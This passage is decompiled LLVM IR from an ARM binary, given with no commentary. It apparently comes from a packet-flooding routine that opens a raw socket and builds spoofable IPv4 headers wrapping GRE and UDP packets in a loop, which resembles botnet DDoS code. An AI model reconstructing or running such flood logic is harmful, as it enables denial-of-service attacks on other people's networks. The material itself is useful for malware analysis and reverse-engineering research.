  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b148 = load i32, i32* @r4, align 4
  store i32 %v0_b148, i32* %r0.global-to-local, align 4
  %v4_b14c = inttoptr i32 %v0_b138 to i32*
  %v5_b14c = call i32 @function_a4e8(i32 %v0_b148, i32* %v4_b14c, i32 25, i32 %v2_b13c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b160 = call i32 @function_13790(i32 2, i32 3, i32 6)
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v7_b164 = icmp eq i32 %v3_b160, -1
  store i1 %v7_b164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b164, label %dec_label_pc_b5e4, label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b00c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b178 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b178, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b18c = call i32 @function_13760(i32 %v3_b160, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b18c, i32* %r0.global-to-local, align 4
  %v7_b190 = icmp eq i32 %v6_b18c, -1
  store i1 %v7_b190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b190, label %dec_label_pc_b5dc, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b170
  %v0_b198 = load i32, i32* @sl, align 4
  %v0_b1a4 = load i32, i32* @r8, align 4
  %v3_b1a4 = mul i32 %v0_b1a4, 65536
  store i32 %v3_b1a4, i32* %r8.global-to-local, align 4
  %v0_b1a8 = load i32, i32* @r7, align 4
  %v0_b1ac = load i32, i32* @r6, align 4
  %v1_b1ac = urem i32 %v0_b1ac, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b1b4 = urem i32 %v0_b198, 65536
  store i32 %v3_b1b4, i32* %r2.global-to-local, align 4
  %v3_b1b8 = urem i32 %v0_b1a4, 65536
  store i32 %v3_b1b8, i32* %r3.global-to-local, align 4
  %v0_b1bc = load i32, i32* @fp, align 4
  %v2_b1bc = icmp eq i32 %v0_b1bc, 0
  store i1 %v2_b1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b1cc = urem i32 %v0_b1a8, 65536
  store i32 %v3_b1cc, i32* @sl, align 4
  %tmp84 = icmp slt i32 %v0_b1bc, 1
  br i1 %tmp84, label %dec_label_pc_b708, label %dec_label_pc_b1dc

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b198
  %v3_b1e0 = mul i32 %v5_b0f8, 65536
  %v1_b1e4 = add i32 %v3_b1e0, 3407872
  %v3_b1ec = udiv i32 %v1_b1e4, 256
  %v0_b1a8.not = or i32 %v0_b1a8, -65536
  %v1_b1fc = xor i32 %v0_b1a8.not, 65535
  %v1_b200 = urem i32 %v0_b1a4, 256
  %tmp85 = mul nsw i32 %v1_b1fc, 256
  %v1_b218 = and i32 %v3_b1ec, 65280
  %v1_b21c = add i32 %v3_b1e0, 524288
  %v4_b220 = udiv i32 %v1_b1e4, 16777216
  %v5_b220 = or i32 %v1_b218, %v4_b220
  store i32 %v5_b220, i32* %r0.global-to-local, align 4
  %v1_b224 = add i32 %v3_b1e0, 1835008
  %v1_b22c = and i32 %tmp85, 65280
  store i32 %v1_b22c, i32* @lr, align 4
  %tmp86 = udiv i32 %v1_b1fc, 256
  %tmp87 = udiv i32 %v0_b1a8, 256
  %v5_b240 = trunc i32 %tmp86 to i8
  %tmp88 = udiv i32 %v0_b198, 256
  %sext29 = mul i32 %tmp87, 16777216
  %v4_b260 = sdiv i32 %sext29, 16777216
  %v3_b26c = mul nuw nsw i32 %v1_b200, 256
  store i32 %v3_b26c, i32* @r5, align 4
  %v3_b270 = udiv i32 %v1_b21c, 256
  %tmp89 = udiv i32 %v0_b1a4, 256
  %v4_b278 = urem i32 %tmp89, 256
  %v5_b278 = or i32 %v4_b278, %v3_b26c
  store i32 %v5_b278, i32* @r7, align 4
  %v3_b27c = ashr i32 %sext29, 31
  %v3_b288 = sdiv i32 %v1_b224, 16777216
  %v1_b28c = and i32 %v3_b270, 65280
  store i32 %v1_b28c, i32* @r6, align 4
  %sext30 = mul i32 %tmp88, 16777216
  %v4_b294 = sdiv i32 %sext30, 16777216
  %v3_b298 = ashr i32 %v1_b224, 31
  %v3_b29c = udiv i32 %v1_b1fc, 65536
  %v4_b2a0 = udiv i32 %v1_b21c, 16777216
  %v5_b2a0 = or i32 %v1_b28c, %v4_b2a0
  store i32 %v5_b2a0, i32* %r8.global-to-local, align 4
  %v3_b2ac = ashr i32 %sext30, 31
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v1_b200, i32* %r2.global-to-local, align 4
  %v3_b2b441 = udiv i32 %v1_b28c, 256
  store i32 %v3_b2b441, i32* %r3.global-to-local, align 4
  %v5_b2bc = trunc i32 %v3_b2ac to i8
  store i32 0, i32* @r4, align 4
  %v4_b318 = sext i8 %v5_b09c to i32
  %sext = mul i32 %v1_b1e4, 256
  %v4_b320 = sdiv i32 %sext, 16777216
  %sext16 = mul nuw i32 %v4_b220, 16777216
  %v4_b330 = sdiv i32 %sext16, 16777216
  %v2_b404 = icmp eq i32 %v1_b1ac, 0
  %sext20 = mul i32 %v1_b21c, 256
  %v4_b424 = sdiv i32 %sext20, 16777216
  %sext21 = mul i32 %v0_b1a4, 16777216
  %v7_b43c = sdiv i32 %sext21, 16777216
  %v1_b32c = trunc i32 %v4_b320 to i8
  br label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %bb96, %dec_label_pc_b1dc
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b2d8 = call i32 @function_13a94(i32 1510, i32 4)
  store i32 %v2_b2d8, i32* %r0.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v3_b2e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v2_b2e4 = load i32, i32* @r4, align 4
  %v5_b2e4 = mul i32 %v2_b2e4, 4
  %v6_b2e4 = add i32 %v5_b2e4, %v2_b02c
  %v7_b2e4 = inttoptr i32 %v6_b2e4 to i32*
  store i32 %v2_b2d8, i32* %v7_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = load i32, i32* %r3.global-to-local, align 4
  %v4_b2e8 = mul i32 %v1_b2e8, 4
  %v5_b2e8 = add i32 %v4_b2e8, %v0_b2e8
  %v6_b2e8 = inttoptr i32 %v5_b2e8 to i32*
  %v7_b2e8 = load i32, i32* %v6_b2e8, align 4
  store i32 %v7_b2e8, i32* %r4.global-to-local, align 4
  %v1_b2ec = inttoptr i32 %v7_b2e8 to i8*
  %v2_b2ec = load i8, i8* %v1_b2ec, align 1
  %tmp = urem i8 %v2_b2ec, 16
  %v1_b2f0 = zext i8 %tmp to i32
  %v1_b2f4 = or i32 %v1_b2f0, 64
  store i32 %v1_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v1_b2f4 to i8
  store i8 %v1_b2f8, i8* %v1_b2ec, align 1
  %v0_b2fc = load i32, i32* %r4.global-to-local, align 4
  %v1_b2fc = inttoptr i32 %v0_b2fc to i8*
  %v2_b2fc = load i8, i8* %v1_b2fc, align 1
  %v1_b300 = and i8 %v2_b2fc, -16
  %v1_b304 = or i8 %v1_b300, 5
  store i32 %v1_b0ac, i32* %r2.global-to-local, align 4
  store i8 %v1_b304, i8* %v1_b2fc, align 1
  %v2_b314 = load i32, i32* %r4.global-to-local, align 4
  %v3_b314 = add i32 %v2_b314, 1
  %v4_b314 = inttoptr i32 %v3_b314 to i8*
  store i8 %v5_b064, i8* %v4_b314, align 1
  store i32 %v4_b318, i32* %r1.global-to-local, align 4
  %v2_b31c = load i32, i32* %r4.global-to-local, align 4
  %v3_b31c = add i32 %v2_b31c, 8
  %v4_b31c = inttoptr i32 %v3_b31c to i8*
  store i8 %v5_b09c, i8* %v4_b31c, align 1
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_b328 = load i32, i32* %r2.global-to-local, align 4
  %v9_b328 = icmp eq i32 %v0_b328, 0
  store i1 %v9_b328, i1* %cpsr_z.global-to-local, align 1
  %v2_b32c = load i32, i32* %r4.global-to-local, align 4
  %v3_b32c = add i32 %v2_b32c, 3
  %v4_b32c = inttoptr i32 %v3_b32c to i8*
  store i8 %v1_b32c, i8* %v4_b32c, align 1
  store i32 %v4_b330, i32* %r2.global-to-local, align 4
  %v0_b334 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b334, label %.thread23, label %.thread

.thread:                                          ; preds = %dec_label_pc_b2cc
  %v1_b334 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_b334, i32* %r3.global-to-local, align 4
  %v2_b338 = trunc i32 %v1_b334 to i8
  %v3_b338 = load i32, i32* %r4.global-to-local, align 4
  %v4_b338 = add i32 %v3_b338, 7
  %v5_b338 = inttoptr i32 %v4_b338 to i8*
  store i8 %v2_b338, i8* %v5_b338, align 1
  %v0_b33c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b33c.pr.pr, label %.thread23, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b340 = load i32, i32* %r4.global-to-local, align 4
  %v4_b340 = add i32 %v3_b340, 6
  %v5_b340 = inttoptr i32 %v4_b340 to i8*
  store i8 64, i8* %v5_b340, align 1
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_b2cc, %.thread, %bb
  %v0_b344 = load i32, i32* %r2.global-to-local, align 4
  %v1_b344 = trunc i32 %v0_b344 to i8
  %v2_b344 = load i32, i32* %r4.global-to-local, align 4
  %v3_b344 = add i32 %v2_b344, 2
  %v4_b344 = inttoptr i32 %v3_b344 to i8*
  store i8 %v1_b344, i8* %v4_b344, align 1
  store i32 %v3_b27c, i32* %r2.global-to-local, align 4
  store i32 %v4_b260, i32* %r1.global-to-local, align 4
  %v2_b354 = load i32, i32* %r4.global-to-local, align 4
  %v3_b354 = add i32 %v2_b354, 9
  %v4_b354 = inttoptr i32 %v3_b354 to i8*
  store i8 47, i8* %v4_b354, align 1
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 5
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 %v1_b358, i8* %v4_b358, align 1
  %v3_b35c = load i32, i32* %stack_var_-40, align 4
  %v5_b364 = mul i32 %v3_b35c, 24
  store i32 %v5_b364, i32* %r3.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b36c = load i32, i32* %r4.global-to-local, align 4
  %v2_b36c = add i32 %v1_b36c, 12
  %v3_b36c = inttoptr i32 %v2_b36c to i32*
  store i32 %v5_b14c, i32* %v3_b36c, align 4
  %v0_b370 = load i32, i32* %r3.global-to-local, align 4
  %v1_b370 = load i32, i32* @sb, align 4
  %v2_b370 = add i32 %v1_b370, %v0_b370
  store i32 %v2_b370, i32* %r3.global-to-local, align 4
  %v0_b374 = load i32, i32* %r1.global-to-local, align 4
  %v1_b374 = trunc i32 %v0_b374 to i8
  %v2_b374 = load i32, i32* %r4.global-to-local, align 4
  %v3_b374 = add i32 %v2_b374, 4
  %v4_b374 = inttoptr i32 %v3_b374 to i8*
  store i8 %v1_b374, i8* %v4_b374, align 1
  %v0_b378 = load i32, i32* %r3.global-to-local, align 4
  %v1_b378 = add i32 %v0_b378, 16
  %v2_b378 = inttoptr i32 %v1_b378 to i32*
  %v3_b378 = load i32, i32* %v2_b378, align 4
  store i32 %v3_b378, i32* %r2.global-to-local, align 4
  %v0_b37c = load i32, i32* %r4.global-to-local, align 4
  %v1_b37c = add i32 %v0_b37c, 20
  store i32 %v1_b37c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_b384 = load i32, i32* %r0.global-to-local, align 4
  %v1_b384 = trunc i32 %v0_b384 to i8
  %v3_b384 = add i32 %v0_b37c, 23
  %v4_b384 = inttoptr i32 %v3_b384 to i8*
  store i8 %v1_b384, i8* %v4_b384, align 1
  %v0_b388 = load i32, i32* %r3.global-to-local, align 4
  %v1_b388 = trunc i32 %v0_b388 to i8
  %v2_b388 = load i32, i32* %r1.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 2
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 %v1_b388, i8* %v4_b388, align 1
  %v0_b38c = load i32, i32* %r4.global-to-local, align 4
  %v1_b38c = add i32 %v0_b38c, 24
  %v2_b38c = inttoptr i32 %v1_b38c to i8*
  %v3_b38c = load i8, i8* %v2_b38c, align 1
  %tmp102 = urem i8 %v3_b38c, 16
  %v1_b390 = zext i8 %tmp102 to i32
  %v1_b394 = or i32 %v1_b390, 64
  store i32 %v1_b394, i32* %r3.global-to-local, align 4
  %v1_b398 = trunc i32 %v1_b394 to i8
  store i8 %v1_b398, i8* %v2_b38c, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = load i32, i32* %r4.global-to-local, align 4
  %v2_b39c = add i32 %v1_b39c, 16
  %v3_b39c = inttoptr i32 %v2_b39c to i32*
  store i32 %v0_b39c, i32* %v3_b39c, align 4
  %v0_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3a0 = add i32 %v0_b3a0, 24
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i8*
  %v3_b3a0 = load i8, i8* %v2_b3a0, align 1
  %v1_b3a4 = and i8 %v3_b3a0, -16
  %v1_b3a8 = or i8 %v1_b3a4, 5
  store i8 %v1_b3a8, i8* %v2_b3a0, align 1
  %v0_b3b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b4 = add i32 %v0_b3b4, 24
  store i32 %v1_b3b4, i32* @r5, align 4
  %v3_b3b8 = add i32 %v0_b3b4, 25
  %v4_b3b8 = inttoptr i32 %v3_b3b8 to i8*
  store i8 %v5_b064, i8* %v4_b3b8, align 1
  store i32 %v3_b288, i32* %r1.global-to-local, align 4
  store i32 %tmp86, i32* %r3.global-to-local, align 4
  store i32 %v3_b298, i32* %r2.global-to-local, align 4
  %v2_b3c8 = load i32, i32* @r5, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v5_b240, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* @r5, align 4
  %v3_b3cc = add i32 %v2_b3cc, 2
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v0_b3d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3d0, label %bb91, label %bb90

bb90:                                             ; preds = %.thread23
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %.thread23, %bb90
  store i32 %v3_b29c, i32* %r1.global-to-local, align 4
  %v0_b3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3d8 = trunc i32 %v0_b3d8 to i8
  %v2_b3d8 = load i32, i32* @r5, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 3
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i8*
  store i8 %v1_b3d8, i8* %v4_b3d8, align 1
  store i32 %v4_b318, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3e0, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  %v1_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3e0 = trunc i32 %v1_b3e0 to i8
  %v3_b3e0 = load i32, i32* @r5, align 4
  %v4_b3e0 = add i32 %v3_b3e0, 6
  %v5_b3e0 = inttoptr i32 %v4_b3e0 to i8*
  store i8 %v2_b3e0, i8* %v5_b3e0, align 1
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3e8 = trunc i32 %v0_b3e8 to i8
  %v2_b3e8 = load i32, i32* @r5, align 4
  %v3_b3e8 = add i32 %v2_b3e8, 5
  %v4_b3e8 = inttoptr i32 %v3_b3e8 to i8*
  store i8 %v1_b3e8, i8* %v4_b3e8, align 1
  %v0_b3ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b3ec = trunc i32 %v0_b3ec to i8
  %v2_b3ec = load i32, i32* @r5, align 4
  %v3_b3ec = add i32 %v2_b3ec, 8
  %v4_b3ec = inttoptr i32 %v3_b3ec to i8*
  store i8 %v1_b3ec, i8* %v4_b3ec, align 1
  %v0_b3f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3f0, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_b3f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b3f0 = trunc i32 %v1_b3f0 to i8
  %v3_b3f0 = load i32, i32* @r5, align 4
  %v4_b3f0 = add i32 %v3_b3f0, 7
  %v5_b3f0 = inttoptr i32 %v4_b3f0 to i8*
  store i8 %v2_b3f0, i8* %v5_b3f0, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v0_b3f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3f4 = trunc i32 %v0_b3f4 to i8
  %v2_b3f4 = load i32, i32* @r5, align 4
  %v3_b3f4 = add i32 %v2_b3f4, 9
  %v4_b3f4 = inttoptr i32 %v3_b3f4 to i8*
  store i8 %v1_b3f4, i8* %v4_b3f4, align 1
  %v0_b3f8 = call i32 @function_fe24()
  store i32 %v0_b3f8, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r1.global-to-local, align 4
  store i1 %v2_b404, i1* %cpsr_z.global-to-local, align 1
  %v1_b408 = sub i32 1023, %v0_b3f8
  store i32 %v1_b408, i32* %r3.global-to-local, align 4
  br i1 %v2_b404, label %.thread24, label %.thread25

.thread24:                                        ; preds = %bb95
  %v2_b410 = load i32, i32* @r5, align 4
  %v3_b410 = add i32 %v2_b410, 16
  %v4_b410 = inttoptr i32 %v3_b410 to i32*
  store i32 %v1_b408, i32* %v4_b410, align 4
  br label %bb96

.thread25:                                        ; preds = %bb95
  %v1_b40c = load i32, i32* %r4.global-to-local, align 4
  %v2_b40c = add i32 %v1_b40c, 16
  %v3_b40c = inttoptr i32 %v2_b40c to i32*
  %v4_b40c = load i32, i32* %v3_b40c, align 4
  store i32 %v4_b40c, i32* %r3.global-to-local, align 4
  %v2_b414 = load i32, i32* @r5, align 4
  %v3_b414 = add i32 %v2_b414, 16
  %v4_b414 = inttoptr i32 %v3_b414 to i32*
  store i32 %v4_b40c, i32* %v4_b414, align 4
  br label %bb96

bb96:                                             ; preds = %.thread24, %.thread25
  store i32 %v4_b294, i32* %r3.global-to-local, align 4
  %v0_b41c = load i32, i32* %r4.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 44
  store i32 %v1_b41c, i32* @r6, align 4
  %v1_b420 = load i32, i32* @r5, align 4
  %v2_b420 = add i32 %v1_b420, 12
  %v3_b420 = inttoptr i32 %v2_b420 to i32*
  store i32 %v0_b3f8, i32* %v3_b420, align 4
  store i32 %v4_b424, i32* %r2.global-to-local, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = trunc i32 %v0_b428 to i8
  %v2_b428 = load i32, i32* @r6, align 4
  %v3_b428 = inttoptr i32 %v2_b428 to i8*
  store i8 %v1_b428, i8* %v3_b428, align 1
  %v3_b42c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b42c, i32* %r3.global-to-local, align 4
  %v0_b430 = load i32, i32* %r2.global-to-local, align 4
  %v1_b430 = trunc i32 %v0_b430 to i8
  %v2_b430 = load i32, i32* @r6, align 4
  %v3_b430 = add i32 %v2_b430, 5
  %v4_b430 = inttoptr i32 %v3_b430 to i8*
  store i8 %v1_b430, i8* %v4_b430, align 1
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 1
  store i32 %v1_b434, i32* @r4, align 4
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v7_b43c, i32* %r2.global-to-local, align 4
  %v1_b440 = load i32, i32* @fp, align 4
  %v9_b440 = icmp eq i32 %v1_b434, %v1_b440
  store i1 %v9_b440, i1* %cpsr_z.global-to-local, align 1
  %v2_b444 = load i32, i32* @r6, align 4
  %v3_b444 = add i32 %v2_b444, 1
  %v4_b444 = inttoptr i32 %v3_b444 to i8*
  store i8 %v5_b2bc, i8* %v4_b444, align 1
  %v0_b448 = load i32, i32* @r7, align 4
  %v1_b448 = trunc i32 %v0_b448 to i8
  %v2_b448 = load i32, i32* @r6, align 4
  %v3_b448 = add i32 %v2_b448, 2
  %v4_b448 = inttoptr i32 %v3_b448 to i8*
  store i8 %v1_b448, i8* %v4_b448, align 1
  %v0_b44c = load i32, i32* %r2.global-to-local, align 4
  %v1_b44c = trunc i32 %v0_b44c to i8
  %v2_b44c = load i32, i32* @r6, align 4
  %v3_b44c = add i32 %v2_b44c, 3
  %v4_b44c = inttoptr i32 %v3_b44c to i8*
  store i8 %v1_b44c, i8* %v4_b44c, align 1
  %v0_b450 = load i32, i32* %r8.global-to-local, align 4
  %v1_b450 = trunc i32 %v0_b450 to i8
  %v2_b450 = load i32, i32* @r6, align 4
  %v3_b450 = add i32 %v2_b450, 4
  %v4_b450 = inttoptr i32 %v3_b450 to i8*
  store i8 %v1_b450, i8* %v4_b450, align 1
  %v0_b454 = load i32, i32* @r4, align 4
  store i32 %v0_b454, i32* %stack_var_-40, align 4
  %v5_b458 = icmp slt i32 %v1_b434, %v1_b440
  br i1 %v5_b458, label %dec_label_pc_b2cc, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %bb96
  %v1_b464 = add i32 %v5_b0f8, 8
  store i32 %v1_b464, i32* %r3.global-to-local, align 4
  %v1_b468 = add i32 %v5_b0f8, 52
  store i32 %v1_b468, i32* %r1.global-to-local, align 4
  %v0_b474.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b474.preheader

dec_label_pc_b474.preheader:                      ; preds = %dec_label_pc_b45c, %dec_label_pc_b708
  %v0_b474.pre = phi i32 [ %v0_b474.pre.pre, %dec_label_pc_b45c ], [ %v0_b1bc, %dec_label_pc_b708 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_b468, %dec_label_pc_b45c ], [ %v1_b714, %dec_label_pc_b708 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_b464, %dec_label_pc_b45c ], [ %v1_b710, %dec_label_pc_b708 ]
  %v2_b6ec = icmp eq i32 %v1_b118, 0
  %v2_b4ec = icmp eq i32 %v1_b1ac, 0
  %v2_b4b8 = icmp eq i32 %v5_b14c, -1
  %v7_b4b8 = icmp eq i32 %v5_b14c, -1
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b474.preheader
  %v0_b474 = phi i32 [ %v0_b474.pre, %dec_label_pc_b474.preheader ], [ %v1_b5cc, %dec_label_pc_b508 ]
  %v2_b474 = icmp eq i32 %v0_b474, 0
  store i1 %v2_b474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_b474, 1
  br label %dec_label_pc_b47c

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b474
  br i1 %tmp97, label %dec_label_pc_b47c, label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b47c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b480
  %v1_b4a0 = phi i32 [ %v1_b5c8, %dec_label_pc_b508 ], [ 0, %dec_label_pc_b480 ]
  %v5_b490 = mul i32 %v1_b4a0, 24
  %v1_b494 = load i32, i32* @sb, align 4
  %v2_b494 = add i32 %v1_b494, %v5_b490
  store i32 %v2_b494, i32* %r3.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v1_b49c = add i32 %v2_b494, 20
  %v2_b49c = inttoptr i32 %v1_b49c to i8*
  %v3_b49c = load i8, i8* %v2_b49c, align 1
  %v4_b49c = zext i8 %v3_b49c to i32
  store i32 %v4_b49c, i32* %r2.global-to-local, align 4
  %v4_b4a0 = mul i32 %v1_b4a0, 4
  %v5_b4a0 = add i32 %v4_b4a0, %v2_b02c
  %v6_b4a0 = inttoptr i32 %v5_b4a0 to i32*
  %v7_b4a0 = load i32, i32* %v6_b4a0, align 4
  store i32 %v7_b4a0, i32* @r5, align 4
  %v7_b4a4 = icmp eq i8 %v3_b49c, 31
  store i1 %v7_b4a4, i1* %cpsr_z.global-to-local, align 1
  %v1_b4a8 = add i32 %v7_b4a0, 24
  store i32 %v1_b4a8, i32* @r6, align 4
  %v1_b4ac = add i32 %v7_b4a0, 44
  store i32 %v1_b4ac, i32* @r7, align 4
  %tmp103 = icmp ult i8 %v3_b49c, 32
  br i1 %tmp103, label %dec_label_pc_b5ec, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b48c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  %v0_b4c8 = load i32, i32* @sl, align 4
  %v9_b4c8 = icmp eq i32 %v0_b4c8, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  store i1 %v9_b4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4c8, label %dec_label_pc_b66c, label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge, %dec_label_pc_b4c0
  %v1_b4d4 = phi i32 [ %v1_b4d4.pre, %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_b4c0 ]
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v9_b4d4 = icmp eq i32 %v3_b1b4, %v1_b4d4
  store i1 %v9_b4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4d4, label %dec_label_pc_b6a4, label %dec_label_pc_b4dc

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge, %dec_label_pc_b4d0
  %v1_b4e0 = phi i32 [ %v1_b4e0.pre, %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge ], [ %v1_b4d4, %dec_label_pc_b4d0 ]
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v9_b4e0 = icmp eq i32 %v3_b1b8, %v1_b4e0
  store i1 %v9_b4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4e0, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b4ec, label %dec_label_pc_b6e4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_b4e8
  %v1_b4f0 = load i32, i32* @r5, align 4
  %v2_b4f0 = add i32 %v1_b4f0, 16
  %v3_b4f0 = inttoptr i32 %v2_b4f0 to i32*
  %v4_b4f0 = load i32, i32* %v3_b4f0, align 4
  store i32 %v4_b4f0, i32* %r3.global-to-local, align 4
  %v2_b4f4 = load i32, i32* @r6, align 4
  %v3_b4f4 = add i32 %v2_b4f4, 16
  %v4_b4f4 = inttoptr i32 %v3_b4f4 to i32*
  store i32 %v4_b4f0, i32* %v4_b4f4, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %bb100, %.thread26
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b508:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4, %dec_label_pc_b6f8
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b50c = load i32, i32* @r8, align 4
  %v1_b50c = trunc i32 %v0_b50c to i8
  %v2_b50c = load i32, i32* @r5, align 4
  %v3_b50c = add i32 %v2_b50c, 10
  %v4_b50c = inttoptr i32 %v3_b50c to i8*
  store i8 %v1_b50c, i8* %v4_b50c, align 1
  %v0_b510 = load i32, i32* @r8, align 4
